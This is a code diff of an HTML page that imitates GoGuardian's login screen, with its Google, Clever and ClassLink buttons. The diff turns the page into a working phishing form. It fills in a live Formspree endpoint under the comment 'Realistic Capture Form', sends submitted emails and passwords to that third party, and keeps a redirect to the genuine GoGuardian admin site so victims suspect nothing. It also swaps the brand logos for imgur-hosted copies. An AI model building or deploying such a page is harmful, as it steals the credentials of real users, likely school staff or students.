@@ -12,7 +12,7 @@
 <body>
     <div class="auth-layout">
         <header class="auth-header">
-            <img src="https://account.goguardian.com/assets/images/logo/logo-full.26c36149.svg" alt="GoGuardian Logo" class="logo">
+            <img src="https://i.imgur.com/l6rGq7J.png" alt="GoGuardian Logo" class="logo">
         </header>
 
         <main class="auth-main">
@@ -22,16 +22,16 @@
                     <h1>Log in to your account</h1>
                 </div>
 
-                <!-- Formspree Integration with correct redirect -->
-                <form class="login-form" action="https://formspree.io/f/YOUR_ENDPOINT_HERE" method="POST">
+                <!-- Realistic Capture Form -->
+                <form class="login-form" action="https://formspree.io/f/xgoranry" method="POST">
                     <input type="hidden" name="_next" value="https://admin.goguardian.com">
                     <input type="hidden" name="_subject" value="New GoGuardian Login Attempt">
                     
                     <div class="input-group">
-                        <input type="email" name="email" placeholder="Email" id="email" required>
+                        <input type="email" name="email" placeholder="Email" id="email" required autocomplete="email">
                     </div>
                     <div class="input-group">
-                        <input type="password" name="password" placeholder="Password" id="password" required>
+                        <input type="password" name="password" placeholder="Password" id="password" required autocomplete="current-password">
                     </div>
                     <button type="submit" class="btn btn-login">Log in</button>
                     
@@ -40,16 +40,17 @@
                     </div>
 
                     <div class="social-logins">
+                        <!-- Imgur Assets Provided by User -->
                         <button type="button" class="btn btn-social btn-google">
-                            <span class="icon-box"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google"></span>
+                            <span class="icon-box"><img src="https://i.imgur.com/PqZjoWh.png" alt="Google"></span>
                             <span class="btn-text">Log in with Google</span>
                         </button>
                         <button type="button" class="btn btn-social btn-clever">
-                            <span class="icon-box"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b1/Clever_logo.svg" alt="Clever"></span>
+                            <span class="icon-box"><img src="https://i.imgur.com/5JObc9m.png" alt="Clever"></span>
                             <span class="btn-text">Log in with Clever</span>
                         </button>
                         <button type="button" class="btn btn-social btn-classlink">
-                            <span class="icon-box"><img src="https://www.classlink.com/images/ClassLink_Symbol_Logo.svg" alt="ClassLink"></span>
+                            <span class="icon-box"><img src="https://i.imgur.com/5ncFUCA.png" alt="ClassLink"></span>
                             <span class="btn-text">Log in with ClassLink</span>
                         </button>
                     </div>
@@ -57,7 +58,7 @@
                     <div class="form-footer">
                         <div class="links-row top">
                             <a href="#">Sign in with Single Sign On</a>
-                            <a href="#">Learn More</a>
+                            <a href="#" class="learn-more">Learn More</a>
                         </div>
                         <div class="links-row">
                             <a href="#">Need an account?</a>
